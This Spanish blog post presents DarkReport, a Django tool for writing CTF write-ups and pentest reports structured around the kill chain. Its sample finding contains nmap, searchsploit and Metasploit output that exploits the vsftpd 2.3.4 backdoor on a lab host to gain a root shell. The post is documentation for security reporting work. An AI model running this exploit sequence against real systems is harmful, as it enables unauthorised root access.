---
title: DarkReport
date: 2025-9-11 11:00:00 +0200
categories: [ciberseguridad, software]
tags: [darkreport, writeup, django]     
image: https://github.com/pmartinezrhub/DarkReport/raw/main/DarkReport/static/DarkReport/dark-report-logo.png
---
## DarkReport
Cuando las herramientas que existen no te satisfacen seguramente sea hora de que hagas la tuya propia, la que se adapta a tus necesidades, gustos 
o que tenga mejor usabilidad, rapidez, etc. Como estaba probando tantas herrientas de reporting que me ayudasen a escribir writes ups, tomar notas 
y apuntes de los retos se me ocurrió la idea de crear DarkReport. Lo he diseñado para escribir un write up de un CTF o también para crear un informe de vulnerabilidades. 

## Está basado en las 7 etapas de un ciberataque (killchain)

Como no siempre es necesario las 7 fases ni tampoco es necesario para hacer un reporte, la aplicación esta diseñada para simplificar los reportes sin perder la opción de explicar las 7 fases, cuando se crea un hallazgo algunos campos son obligatorios de otra forma la vulnerabilidad no se explica y si no se explica, no se sabría solucionar. 

- Reconocimiento, es una fase muy importante, pero no siempre necesaria, a veces nos enteramos de que la versión de algún software que estamos utilizando presenta alguna vulnerabilidad. 

- Preparación:  Que herramientas se utilizan para infectar el sistema, troyanizarlo etc, no siempre es requerido dado que por ejemplo un RCE ya nos permite ejecutar comandos en un sistema de forma remota

- Distribución. Me parece muy imporante que los reportes incluya como se entrega el payload aunque en algunos casos sea una obviedad

- Explotación. La explicación técnica de porque ocurre este error/bug o falla de seguridad.

- Instalación: No siempre necesario, pero puede describirse como que programa, malware o rat, queda instalado para ser persistente en el sistema. 

- Comando y control. Como se crea el canal de comunicación con el atacante. Puertos usados, protocolos, etc.

- Acciones en el objetivo: Que acciones puede realizar el adversario una vez tiene comando y control.

![kill chain](https://upload.wikimedia.org/wikipedia/commons/1/1d/Intrusion_Kill_Chain_-_v2.png)

## Login
Por supuesto he implementado una pantalla de login para que no cualquiera pueda entrar a la aplicación.
En el Readme del proyecto podrás encontrar las instrucciones de como cambiar la password por defecto. 
![login](https://raw.githubusercontent.com/pmartinezrhub/DarkReport/refs/heads/main/screenshots/login.png)

## Panel principal
Al entrar en la aplicación te encontrarás una vista de general con una métricas y graficos. En el panel izquierdo podemos cerrar sesión y/o crear nuevos proyectos.
![dashboard](https://raw.githubusercontent.com/pmartinezrhub/DarkReport/refs/heads/main/screenshots/dashboard.png)

### Idioma
Actualmente podemos seleccionar inglés o español, pero está pensado para traducirse a todos los idiomas posibles medidante el uso de locales. En el panel arriba a la derecha

### Resumen
Contine un resumen de la cantidad de proyectos, reportes y hallazgos. 

### Estadísticas 
Proporciona un grafico de las vulnerabilidades actuales y otro de los CVEs encontrados

## Crear proyectos
Simplemente creas un proyecto que albergará los reportes, podemos ponerle el nombre de la empresa, cliente o del sitio, etc que vamos a auditar. 
La vista mostrará las vulnerabilidades en cada reporte ordenadas por la prioridad. 

![vista proyecto](https://raw.githubusercontent.com/pmartinezrhub/DarkReport/refs/heads/main/screenshots/project_view.png)

## Crear reportes
Cada reporte se crea indicando un objetivo, que puede ser un host, una api, o simplemente inventar un nombre, estos reportes contendrán los hallazgos

## Crear hallazgos
Cuando creamos un hallazgo es donde realmente vamos a idenficar la vulnerabilidad y tratar de explicarla en las 7 fases de pausible ataque. 
Se puede buscar un CVE, la aplicación buscará automáticamente el código CVE-XXX-XXX en la base de datos NITS para cargar el Ajax que nos indica que estamos introduciendo un CVE correcto. 
![find](https://raw.githubusercontent.com/pmartinezrhub/DarkReport/refs/heads/main/screenshots/find_detail_view.png)

Al pulsar el botón copiar vamos a obtener un reporte de solo el hallazgo

``` shell
⚠1:  ⚠️ Vulnerabilidad - Remote Code Execution (RCE)
CVE: CVE-2011-2523
🔭 Reconocimiento: nmap -p- 10.88.0.2 -sV -vv
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.3.4
MAC Address: 72:67:68:3C:12:BD (Unknown)
Service Info: OS: Unix
💣 Preparación: └─$ searchsploit vsftpd 2.3.4
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                                 | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                    | unix/remote/17491.rb
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Result
🚚 Distribución: msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 10.88.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.88.0.2:21 - USER: 331 Please specify the password.
[+] 10.88.0.2:21 - Backdoor service has been spawned, handling...
[+] 10.88.0.2:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (10.88.0.1:42055 -> 10.88.0.2:6200) at 2025-09-08 01:06:11 +0200
whoami
root
🪲 Explotación: En julio de 2011, se descubrió que la versión 2.3.4 de vsftpd, descargable desde el sitio principal, había sido comprometida. Los usuarios que iniciaban sesión en un servidor vsftpd-2.3.4 comprometido podían usar una cara sonriente :) como nombre de usuario y obtener acceso a una consola de comandos en el puerto 6200. Esto no se debía a una vulnerabilidad de seguridad en vsftpd, sino a que alguien había subido una versión diferente de vsftpd que contenía una puerta trasera. Desde entonces, el sitio se migró a Google App Engine.
```
Ahora solo tenemos que pergarlo a nuestro write up o al informe final y añadir lo que necesitemos como marcas de markdown etc. 
Te dejo el ejemplo de como quedó después de retocarlo un mínimo aquí: [dockerlabs-firsthacking](../dockerlabs-firsthacking)

### Campos obligatorios y opcionales
Campos obligatorios:
- Tipo de vulnerabilidad - Por defecto es Information disclouser pero hay una lista de todas la vulnerabilidades conocidas.. 
- Distribución  
- Explotación
- Prioridad - Por defecto baja. Los hallazgos dentro de cada reporte se ordenarán por prioridad.

Campos opcionales:
- CVE - Como ya indique se carga con Ajax contra la API del Nist.
- Preparación
- Instalación
- Comando y control
- Acciones en los objetivos
- Fichero recon . Voy a desarrollarlo más pero de momento he dejado la posibilidad de adjuntar un fichero.

![](https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/The_Unified_Kill_Chain.png/1920px-The_Unified_Kill_Chain.png)

Por supuesto la herramienta permite modificar los hallazgos así como borrar proyectos, reportes, exportar datos, etc. 

## Desarrollo
DarkReport esta desarrollado con el framework Django (Python)

 - 1 Como cualquier software, evoluciona, irá mutandom mejorando y acepta contribuciones ideas y desarrollos, me gustaría tener opiniones para mejorar la herramienta.
Es la primera versión, pero iré mejorándola poco a poco se que tiene mucho por mejorar. 

 - 2 Su diseño es iconográfico, sencillo y de momento un diseño oscuro de ahí un poco su nombre. 

Puedes descargarlo y obtener más instrucciones desde de este repositorio de Github incluye Dockerfile para desplegar rapidamente el proyecto.
[https://github.com/pmartinezrhub/DarkReport](https://github.com/pmartinezrhub/DarkReport)
 